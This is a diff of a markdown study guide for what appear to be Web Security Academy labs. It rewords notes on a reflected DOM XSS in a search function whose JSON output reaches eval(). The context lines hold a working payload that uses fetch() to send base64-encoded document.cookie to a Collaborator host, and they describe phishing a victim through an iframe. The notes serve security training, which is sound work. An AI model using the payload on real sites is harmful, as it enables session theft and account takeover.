@@ -280,13 +280,13 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 >In the **Search** function a Reflected XSS vulnerability is ***identified*** using ```\"-alert(1)}//``` payload. The attacker then deliver an exploit phishing link to the victim with a cookie stealing payload inside a hosted **iframe** on their exploit server.  
 
->***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively cancelled out.  
+>***Identify*** that the search JavaScript `source code` on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to `eval()`.  Backslash is not escaped correctly and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively cancelled out.  
 
 ```JavaScript
 \"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
 ```  
 
->Image show the request using search function to send the document.cookie value in base64 to collaboration server.  
+>Image show the request using search function to send the document.cookie value in base64 using `btoa()` function to collaboration server.  
 
 ![Reflected DOM-XSS JSON cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
